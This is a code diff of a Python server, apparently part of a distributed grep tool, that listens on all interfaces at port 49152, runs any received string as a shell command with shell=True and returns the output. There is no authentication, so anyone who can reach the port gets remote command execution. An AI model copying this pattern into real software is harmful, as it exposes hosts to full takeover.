@@ -1,36 +1,34 @@
 import socket
 import subprocess
 
-# Function that is called when sender
-# requests the grep results file
-def process_get_result():
-    pass
-
 def receive_data():
-    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     local_ip = "0.0.0.0"
-    local_udp_port = 49152
+    local_tcp_port = 49152
     # Bind socket to local port
-    udp_socket.bind((local_ip, local_udp_port))
+    tcp_socket.bind((local_ip, local_tcp_port))
+    tcp_socket.listen(10)
     while True:
-        # Receive in chunks of 1024 bytess
-        command, sender_ip_addr = udp_socket.recvfrom(1024)
+        client_socket, client_address = tcp_socket.accept()
+        # Accept client connection
         try:
-            result = subprocess.check_output(command.decode(), shell=True, stderr=subprocess.STDOUT)
-        except subprocess.CalledProcessError as e:
-            result = e.output
-        
-        # print(result)
-        result = result.decode() + "EOD"
-        result = result.encode()
+            # Receive the command from the client
+            command = client_socket.recv(1024).decode()
+
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+
+            print(result)
+            result = result.decode() + "EOD"
+            result = result.encode()
        
-        bytes_sent = 0
-        chunk_size = 1024
-        for i in range(0, len(result), chunk_size):
-            chunk = result[i:i+chunk_size]
-             # Send command output to sender
-            bytes_sent += udp_socket.sendto(chunk, sender_ip_addr)
-        
+            bytes_sent = 0
+            bytes_sent += client_socket.send(result)
+            print("Size of data:", len(result))
+            print("Size of sent bytes:", bytes_sent)
+        except Exception as e:
+            print(f"Error: {str(e)}")
+        finally:
+            client_socket.close()
 
 if __name__ == "__main__":
     receive_data()
